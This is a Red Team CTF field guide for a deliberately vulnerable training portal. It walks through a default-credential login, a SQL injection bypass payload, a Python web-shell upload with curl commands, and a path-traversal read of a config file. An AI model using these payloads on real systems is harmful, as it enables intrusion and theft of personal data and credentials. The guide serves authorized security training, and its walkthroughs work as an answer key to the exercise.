# 🟥 Red Team Field Guide
### Barangay Malinaw BIMS — Attack-Defense CTF

> **Authorized training only.** Everything in this guide applies **only** to the
> training portal on the isolated lab network. Using these techniques on any other
> system without written authorization is illegal under the Cybercrime Prevention
> Act of 2012 (RA 10175). You agreed to this when the session began.

---

## Your mission

The "Barangay Services Portal" is a fictional LGU web app. It was built with four
planted security bugs. Your job: find each bug, exploit it, capture the **flag** it
hides, and submit that flag on the scoreboard to score.

| Bug | Points |
|-----|-------:|
| Default admin password | 10 |
| SQL injection on login | 20 |
| Unrestricted file upload → web shell | 30 |
| Exposed config file | 15 |

A flag always looks like `FLAG{...}`. Flags change every round, so one you captured
earlier won't work later — recapture after each reset.

## Getting connected

Your instructor will give you the range address. In this guide it's written as
`<range-ip>`.

- **Portal (your target):** `http://<range-ip>:5050`
- **Scoreboard:** `http://<range-ip>:5001` → **Register** as a Red team, then **Play**.

You need only a web browser. A terminal with `curl` helps for the later challenges —
examples are given for both.

---

## Warm-up: how to look at an unknown web app

Before attacking, **map it**. Spend two minutes doing this on the portal:

1. Click every link and button. Note each **page** and what it does.
2. Find every **input**: login fields, file pickers, anything with a URL that takes a
   value (like `?file=...`).
3. Watch how the app **responds** — error messages, what shows after you log in, what
   appears in the address bar.

Attackers don't guess randomly; they find the inputs and ask "what happens if I send
something unexpected here?" That's the whole game.

---

## Challenge 1 — Default admin password (10 pts)

**Concept.** Software often ships with a built-in "default" account so someone can log
in the first time. If nobody changes it, anyone who knows the default walks right in.
Default and reused passwords are behind a huge share of real-world breaches.

**Recon.** Find the login page. Ask: *what's the most obvious username an admin account
would have, and the laziest password someone might leave on it?*

<details>
<summary>Hint</summary>

The username is the most common admin username there is. The password is a classic
"I'll change it later" placeholder that never got changed. Try a few obvious
combinations.
</details>

<details>
<summary>Walkthrough</summary>

1. Go to `http://<range-ip>:5050/login`.
2. Username `admin`, password `admin123`.
3. The dashboard loads and displays the flag.

The flag appears on the dashboard right after login.
</details>

**What you just did.** You used a credential that should have been changed on day one.
In the real world this is how attackers get in through forgotten test accounts,
router admin panels, and database consoles.

---

## Challenge 2 — SQL injection on the login form (20 pts)

**Concept.** When an app builds a database query by gluing your input directly into the
query text, you can *inject* your own database logic. On a login form, that can mean
logging in without a valid password — or reading data you were never meant to see.

The login check is essentially:

```
SELECT * FROM users WHERE username = '<what you typed>' AND password = '<what you typed>';
```

If you can control the text inside those quotes, you control the query.

**Recon.** Put a single quote `'` in the username and submit. A broken-looking error, or
odd behavior, means the input is reaching the database raw.

<details>
<summary>Hint</summary>

You want to make the `WHERE` clause always true, then comment out the rest so the
password check is ignored. The classic payload uses `OR` and a comment marker (`--`).
</details>

<details>
<summary>Walkthrough (auth bypass)</summary>

In the **username** field, enter:

```
' OR '1'='1' --
```

Put anything in the password field. Submit. The query becomes always-true and the
password check is commented out, so you're logged in **without valid credentials** —
and the app hands you the SQL-injection flag.

**With curl:**
```bash
curl -s --data-urlencode "username=' OR '1'='1' --" \
        --data-urlencode "password=x" \
        http://<range-ip>:5050/login | grep -o 'FLAG{[^}]*}'
```
</details>

<details>
<summary>Then: see what the bypass really costs</summary>

Once you're in, open the **Residents** module. You now have every constituent's
record — 160 people's names, birthdates, addresses, contact and PhilSys numbers.
*That* is the real damage of an auth bypass: not the login, but everything behind it.
Imagine this were your barangay's actual system.
</details>

**What you just did.** You bypassed authentication with no password and reached a full
registry of personal data. SQL injection has leaked millions of real records this way.
The fix is simple (parameterized queries) — which is exactly what Blue team will do.

---

## Challenge 3 — Unrestricted file upload → web shell (30 pts)

**Concept.** If an app lets you upload a file **and** later runs or serves that file as
code, you can upload your own program and make the server execute it. That's a **web
shell** — remote control of the machine. This is the highest-value bug for a reason:
it's full code execution, not just data access.

**Recon.** Find the "Data Import." It takes an upload, saves it, and offers to **run**
it. Ask: *what stops me uploading a file that isn't a real report?* (Answer: nothing.)

<details>
<summary>Hint</summary>

The runner executes uploaded Python and shows you whatever it prints. So write a tiny
Python file that reads the server's secret and prints it — then upload and run it.
</details>

<details>
<summary>Walkthrough</summary>

1. Log in first (any method from Challenge 1 or 2).
2. Make a file called `shell.py` with this content:

   ```python
   import subprocess
   # read the flag the server hid, and prove we can run commands
   print(subprocess.getoutput("cat secret/shell_flag.txt 2>/dev/null || find / -name shell_flag.txt 2>/dev/null"))
   print("whoami:", subprocess.getoutput("whoami"))
   ```

3. Go to **Data Import**, upload `shell.py`, then click **Process** next to it.
4. The page prints the flag (and the user the server runs as — proof of code execution).

**With curl** (reuse your logged-in session cookie, or log in inline):
```bash
curl -s -c j -b j -d "username=admin&password=admin123" http://<range-ip>:5050/login -o /dev/null
curl -s -b j -F "report=@shell.py" http://<range-ip>:5050/reports -o /dev/null
curl -s -b j http://<range-ip>:5050/run/shell.py
```
</details>

**What you just did.** You went from "upload a file" to "run commands on the server."
This is one of the most serious web vulnerabilities there is — a single unchecked
upload can mean total compromise of the host.

---

## Challenge 4 — Exposed config file (15 pts)

**Concept.** Apps keep secrets (database passwords, mail credentials) in config files.
Those files must never be reachable from the web. A **path traversal** bug lets you walk
*out* of the public folder using `../` and grab files you shouldn't.

**Recon.** The home page mentions a downloads folder: `/download?file=readme.txt`. Ask:
*what if I ask for a file outside that folder?*

<details>
<summary>Hint</summary>

`../` means "go up one directory." The config file sits one level above the public
downloads folder. Point the `file=` parameter at it.
</details>

<details>
<summary>Walkthrough</summary>

In the browser address bar (or with curl):

```
http://<range-ip>:5050/download?file=../config.ini
```

```bash
curl -s "http://<range-ip>:5050/download?file=../config.ini"
```

The returned file contains database and mail credentials — and the flag in the
`[secrets]` section.
</details>

**What you just did.** You read the app's secret credentials straight off the server.
In reality, leaked config files hand attackers the keys to databases, email, and cloud
accounts — often the first domino in a full breach.

---

## Submitting flags

For each flag you capture, go to the scoreboard → **Play** → paste the `FLAG{...}`
string → **Submit**. Points land immediately. Each flag scores once per team, and
harder bugs pay more.

## After you've scored them all

- Re-read each challenge and write, in one sentence, **how a developer would have
  prevented it.** If you can explain the fix simply, you understand the bug — that's
  what you carry back to work.
- In Round 2 you may switch hats: the same bugs, now from the defender's side. See the
  Blue Team Field Guide.

---
*Barangay Services Portal CTF · CyberTumbler × GhostNet Academy · For authorized training use only.*
